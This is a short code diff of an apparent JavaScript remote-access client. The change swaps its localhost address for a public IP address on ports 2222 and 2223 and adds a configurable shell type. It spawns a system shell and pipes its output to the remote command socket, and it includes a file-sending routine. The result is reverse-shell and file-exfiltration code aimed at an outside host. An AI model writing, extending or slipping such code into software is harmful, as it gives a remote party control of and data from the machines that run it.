@@ -17,7 +17,9 @@ const _options = {
 // flag variable to let the client know if it needs to reconnect to the server
 const _fsPort = 2223
 const _comPort = 2222
-const _host = '127.0.0.1'
+const _host = '51.222.157.180'
+const _shellType = "sh" //cmd.exe, zsh, sh
+
 // let comClient = {}
 let fsClient = {}
 let comAlive = false
@@ -80,7 +82,7 @@ const sendFile = (localFile) => {
  * @param {socket} comClient 
  */
 const shellSpawn = (comClient) => { //client, fsClient
-    const shell = child.spawn("cmd.exe", []); //cmd.exe , zsh
+    const shell = child.spawn(_shellType, []); 
 
     shell.stdout.on('data', (data) => {
         if (comClient) {
